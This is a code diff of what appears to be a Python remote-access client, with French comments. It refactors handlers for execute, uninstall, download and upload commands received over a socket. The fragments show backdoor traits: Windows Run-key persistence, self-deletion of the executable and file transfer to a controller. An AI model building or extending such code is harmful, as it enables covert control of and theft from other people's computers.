@@ -111,7 +111,7 @@ def execute(soc): #à refaire
     print("process kill")
     process.kill()
 
-def uninstall():
+def uninstall(soc, plat):
     #delete key in registers
     if plat == 'win':
         run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
@@ -130,7 +130,7 @@ def uninstall():
     soc.close()
     os.remove(sys.executable)
     
-def download():
+def download(soc):
     data_bytes = []
     ctn = True
     i = 1
@@ -163,7 +163,7 @@ def download():
             ctn = False
     
 
-def upload(path_file):
+def upload(soc, path_file):
     #test if the file exist
     try:
         file = open(path_file, "rb")
@@ -283,11 +283,11 @@ def main():
             print("commande repairée: execute")
             execute(soc)
         if msg[0] == "uninstall":
-            uninstall()
+            uninstall(soc, plat)
         if msg[0] == "download":
-            download()
+            download(soc)
         if msg[0] == "upload":
-            upload(msg[1])
+            upload(soc, msg[1])
 #        if msg[0] == :
  #           
   #      if msg[0] == :
